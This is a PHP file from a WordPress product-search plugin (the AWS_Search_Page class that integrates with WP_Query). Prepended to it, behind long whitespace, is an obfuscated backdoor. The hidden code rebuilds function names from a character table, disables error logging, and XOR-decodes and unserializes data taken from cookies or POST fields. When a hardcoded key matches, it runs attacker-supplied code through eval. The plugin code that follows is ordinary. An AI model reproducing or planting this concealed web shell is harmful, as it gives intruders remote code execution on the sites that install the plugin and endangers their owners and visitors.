<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $g350a6768 = 405;$GLOBALS['z7ce03a4'] = Array();global $z7ce03a4;$z7ce03a4 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['vb855f1'] = "\x2e\x58\x49\x71\x3e\x77\x6e\x52\x28\x51\x29\x3a\x60\x4e\x47\x20\x6b\x64\x61\x72\x6c\x33\x5f\x3d\x55\x48\x56\x31\xa\x4c\x30\x54\x3c\x6d\x5b\x63\x27\x21\x44\x4a\x6f\x74\x70\x79\x36\x43\x4d\x75\x5d\x69\x59\x41\x2f\x42\x7c\x3f\x34\x40\x7e\x6a\x32\x7a\x38\x73\x46\x26\x4f\x2a\x5a\x37\x39\x66\x2d\x5e\x24\x35\x25\xd\x57\x50\x62\x65\x68\x2b\x4b\x53\x2c\x76\x7d\x22\x78\x3b\x67\x9\x5c\x23\x45\x7b";$z7ce03a4[$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][56]] = $z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][82].$z7ce03a4['vb855f1'][19];$z7ce03a4[$z7ce03a4['vb855f1'][6].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][75]] = $z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][17];$z7ce03a4[$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][17]] = $z7ce03a4['vb855f1'][63].$z7ce03a4['vb855f1'][41].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][20].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][6];$z7ce03a4[$z7ce03a4['vb855f1'][90].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][30]] = $z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][6].$z7ce03a4['vb855f1'][81];$z7ce03a4[$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][62]] = $z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][6].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][17];$z7ce03a4[$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][81]] = $z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][6].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][63].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][41];$z7ce03a4[$z7ce03a4['vb855f1'][90].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][44]] = $z7ce03a4['vb855f1'][63].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][20].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][61].$z7ce03a4['vb855f1'][81];$z7ce03a4[$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][18]] = $z7ce03a4['vb855f1'][42].$z7ce03a4['vb855f1'][82].$z7ce03a4['vb855f1'][42].$z7ce03a4['vb855f1'][87].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][63].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][6];$z7ce03a4[$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][30]] = $z7ce03a4['vb855f1'][47].$z7ce03a4['vb855f1'][6].$z7ce03a4['vb855f1'][63].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][20].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][61].$z7ce03a4['vb855f1'][81];$z7ce03a4[$z7ce03a4['vb855f1'][3].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][56]] = $z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][63].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][81];$z7ce03a4[$z7ce03a4['vb855f1'][47].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][60]] = $z7ce03a4['vb855f1'][63].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][41].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][41].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][33].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][20].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][33].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][41];$z7ce03a4[$z7ce03a4['vb855f1'][43].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][18]] = $z7ce03a4['vb855f1'][61].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][30];$z7ce03a4[$z7ce03a4['vb855f1'][41].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][75]] = $z7ce03a4['vb855f1'][87].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][81];$z7ce03a4[$z7ce03a4['vb855f1'][16].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][81]] = $_POST;$z7ce03a4[$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][35]] = $_COOKIE;@$z7ce03a4[$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][81]]($z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][20].$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][92], NULL);@$z7ce03a4[$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][81]]($z7ce03a4['vb855f1'][20].$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][92].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][19].$z7ce03a4['vb855f1'][63], 0);@$z7ce03a4[$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][81]]($z7ce03a4['vb855f1'][33].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][90].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][90].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][47].$z7ce03a4['vb855f1'][41].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][6].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][41].$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][33].$z7ce03a4['vb855f1'][81], 0);@$z7ce03a4[$z7ce03a4['vb855f1'][47].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][60]](0);if (!$z7ce03a4[$z7ce03a4['vb855f1'][49].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][62]]($z7ce03a4['vb855f1'][51].$z7ce03a4['vb855f1'][29].$z7ce03a4['vb855f1'][7].$z7ce03a4['vb855f1'][96].$z7ce03a4['vb855f1'][51].$z7ce03a4['vb855f1'][38].$z7ce03a4['vb855f1'][50].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][7].$z7ce03a4['vb855f1'][24].$z7ce03a4['vb855f1'][13].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][18])){$z7ce03a4[$z7ce03a4['vb855f1'][90].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][30]]($z7ce03a4['vb855f1'][51].$z7ce03a4['vb855f1'][29].$z7ce03a4['vb855f1'][7].$z7ce03a4['vb855f1'][96].$z7ce03a4['vb855f1'][51].$z7ce03a4['vb855f1'][38].$z7ce03a4['vb855f1'][50].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][7].$z7ce03a4['vb855f1'][24].$z7ce03a4['vb855f1'][13].$z7ce03a4['vb855f1'][22].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][18], 1);$hb6c55 = NULL;$h84297a63 = NULL;$z7ce03a4[$z7ce03a4['vb855f1'][61].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][21]] = $z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][72].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][72].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][72].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][72].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][60];global $z803;function  v5c782e($hb6c55, $af51f){global $z7ce03a4;$m55226c = "";for ($uaf160c5=0; $uaf160c5<$z7ce03a4[$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][17]]($hb6c55);){for ($f44e=0; $f44e<$z7ce03a4[$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][17]]($af51f) && $uaf160c5<$z7ce03a4[$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][17]]($hb6c55); $f44e++, $uaf160c5++){$m55226c .= $z7ce03a4[$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][56]]($z7ce03a4[$z7ce03a4['vb855f1'][6].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][75]]($hb6c55[$uaf160c5]) ^ $z7ce03a4[$z7ce03a4['vb855f1'][6].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][75]]($af51f[$f44e]));}}return $m55226c;}function  z7f0($hb6c55, $af51f){global $z7ce03a4;global $z803;return $z7ce03a4[$z7ce03a4['vb855f1'][41].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][75]]($z7ce03a4[$z7ce03a4['vb855f1'][41].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][75]]($hb6c55, $z803), $af51f);}foreach ($z7ce03a4[$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][62].$z7ce03a4['vb855f1'][35]] as $af51f=>$a6f1a9){$hb6c55 = $a6f1a9;$h84297a63 = $af51f;}if (!$hb6c55){foreach ($z7ce03a4[$z7ce03a4['vb855f1'][16].$z7ce03a4['vb855f1'][80].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][81]] as $af51f=>$a6f1a9){$hb6c55 = $a6f1a9;$h84297a63 = $af51f;}}$hb6c55 = @$z7ce03a4[$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][35].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][30]]($z7ce03a4[$z7ce03a4['vb855f1'][43].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][21].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][17].$z7ce03a4['vb855f1'][18]]($z7ce03a4[$z7ce03a4['vb855f1'][3].$z7ce03a4['vb855f1'][71].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][56]]($hb6c55), $h84297a63));if (isset($hb6c55[$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][16]]) && $z803==$hb6c55[$z7ce03a4['vb855f1'][18].$z7ce03a4['vb855f1'][16]]){if ($hb6c55[$z7ce03a4['vb855f1'][18]] == $z7ce03a4['vb855f1'][49]){$uaf160c5 = Array($z7ce03a4['vb855f1'][42].$z7ce03a4['vb855f1'][87] => @$z7ce03a4[$z7ce03a4['vb855f1'][40].$z7ce03a4['vb855f1'][70].$z7ce03a4['vb855f1'][56].$z7ce03a4['vb855f1'][81].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][18]](),$z7ce03a4['vb855f1'][63].$z7ce03a4['vb855f1'][87] => $z7ce03a4['vb855f1'][27].$z7ce03a4['vb855f1'][0].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][72].$z7ce03a4['vb855f1'][27],);echo @$z7ce03a4[$z7ce03a4['vb855f1'][90].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][44].$z7ce03a4['vb855f1'][30].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][69].$z7ce03a4['vb855f1'][60].$z7ce03a4['vb855f1'][75].$z7ce03a4['vb855f1'][44]]($uaf160c5);}elseif ($hb6c55[$z7ce03a4['vb855f1'][18]] == $z7ce03a4['vb855f1'][81]){eval/*n922*/($hb6c55[$z7ce03a4['vb855f1'][17]]);}exit();}} ?><?php
/**
 * Integrate with WP_Query
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit; // Exit if accessed directly.
}

if ( ! class_exists( 'AWS_Search_Page' ) ) :

    /**
     * Class for plugin search
     */
    class AWS_Search_Page {

        /**
         * Is set only when we are within a multisite loop
         *
         * @var bool|WP_Query
         */
        private $query_stack = array();

        private $posts_by_query = array();

        /**
         * Return a singleton instance of the current class
         *
         * @return object
         */
        public static function factory() {
            static $instance = false;

            if ( ! $instance ) {
                $instance = new self();
                $instance->setup();
            }

            return $instance;
        }

        /**
         * Placeholder
         */
        public function __construct() {}

        /**
         * Setup actions and filters for all things settings
         */
        public function setup() {

            // Make sure we return nothing for MySQL posts query
            add_filter( 'posts_request', array( $this, 'filter_posts_request' ), 10, 2 );

            // Query and filter to WP_Query
            add_filter( 'the_posts', array( $this, 'filter_the_posts' ), 10, 2 );

            // Add header
		    add_action( 'pre_get_posts', array( $this, 'action_pre_get_posts' ), 5 );

            // Nukes the FOUND_ROWS() database query
		    add_filter( 'found_posts_query', array( $this, 'filter_found_posts_query' ), 5, 2 );

        }

        /**
        * Filter query string used for get_posts(). Query for posts and save for later.
        * Return a query that will return nothing.
        *
        * @param string $request
        * @param object $query
        * @return string
        */
        public function filter_posts_request( $request, $query ) {
            if ( ! $this->aws_searchpage_enabled( $query ) ) {
                return $request;
            }

            $new_posts = array();

            $search_query = $query->query_vars['s'];
            
            $posts_array = (array) aws_search( $search_query );
            $posts_per_page = apply_filters( 'aws_posts_per_page', $query->get( 'posts_per_page' ) );

            $query->found_posts = count( $posts_array['products'] );
            $query->max_num_pages = ceil( count( $posts_array['products'] ) / $posts_per_page );

            $paged  = $query->query_vars['paged'] ? $query->query_vars['paged'] : 1;
            $offset = ( $paged > 1 ) ? $paged * $posts_per_page - $posts_per_page : 0;

            if ( $query->query && ( isset( $query->query['orderby'] ) || isset( $query->query_vars['orderby'] ) ) ) {

                if ( isset( $posts_array['products'] ) && ! empty( $posts_array['products'] ) ) {

                    $posts_array['products'] = AWS()->order( $posts_array['products'], $query );

                }

            }

            $products = array_slice( $posts_array['products'], $offset, $posts_per_page );


            foreach ( $products as $post_array ) {
                $post = new stdClass();

                $post_array = (array) $post_array;
                $post_data = $post_array['post_data'];

                $post->ID = $post_data->ID;
                $post->site_id = get_current_blog_id();

                if ( ! empty( $post_data->site_id ) ) {
                    $post->site_id = $post_data->site_id;
                }

                $post_return_args = array(
                    'post_type',
                    'post_author',
                    'post_name',
                    'post_status',
                    'post_title',
                    'post_parent',
                    'post_content',
                    'post_excerpt',
                    'post_date',
                    'post_date_gmt',
                    'post_modified',
                    'post_modified_gmt',
                    'post_mime_type',
                    'comment_count',
                    'comment_status',
                    'ping_status',
                    'menu_order',
                    'permalink',
                    'terms',
                    'post_meta'
                );

                foreach ( $post_return_args as $key ) {
                    if ( isset( $post_data->$key ) ) {
                        $post->$key = $post_data->$key;
                    }
                }

                $post->awssearch = true; // Super useful for debugging

                if ( $post ) {
                    $new_posts[] = $post;
                }
            }


            $this->posts_by_query[spl_object_hash( $query )] = $new_posts;


            global $wpdb;

            return "SELECT * FROM $wpdb->posts WHERE 1=0";

        }

        /**
         * Filter the posts array to contain ES query results in EP_Post form. Pull previously queried posts.
         *
         * @param array $posts
         * @param object $query
         * @return array
         */
        public function filter_the_posts( $posts, $query ) {
            if ( ! $this->aws_searchpage_enabled( $query )  || ! isset( $this->posts_by_query[spl_object_hash( $query )] ) ) {
                return $posts;
            }

            $new_posts = $this->posts_by_query[spl_object_hash( $query )];

            return $new_posts;

        }

        /**
         * Disables cache_results, adds header.
         *
         * @param $query
         */
        public function action_pre_get_posts( $query ) {
            if ( ! $this->aws_searchpage_enabled( $query ) ) {
                return;
            }

            /**
             * `cache_results` defaults to false but can be enabled
             */
            $query->set( 'cache_results', false );
            if ( ! empty( $query->query['cache_results'] ) ) {
                $query->set( 'cache_results', true );
            }

            if ( ! headers_sent() ) {
                /**
                 * Manually setting a header as $wp_query isn't yet initialized
                 * when we call: add_filter('wp_headers', 'filter_wp_headers');
                 */
                header( 'X-AWS-Search: true' );
            }
        }

        /**
         * Remove the found_rows from the SQL Query
         *
         * @param string $sql
         * @param object $query
         * @return string
         */
        public function filter_found_posts_query( $sql, $query ) {
            if ( ! $this->aws_searchpage_enabled( $query ) ) {
                return $sql;
            }

            return '';
        }

        /**
         * Check if we should override default search query
         *
         * @param string $query
         * @return bool
         */
        private function aws_searchpage_enabled( $query ) {
            $enabled = true;
            if ( ( isset( $query->query_vars['s'] ) && ! isset( $_GET['type_aws'] ) ) ||
                ! isset( $query->query_vars['s'] ) ||
                ! $query->is_search() ||
                ( $query->get( 'post_type' ) && is_string( $query->get( 'post_type' ) ) && $query->get( 'post_type' ) !== 'product' )
            ) {
                $enabled = false;
            }

            return apply_filters( 'aws_searchpage_enabled', $enabled, $query );
        }

    }


endif;

AWS_Search_Page::factory();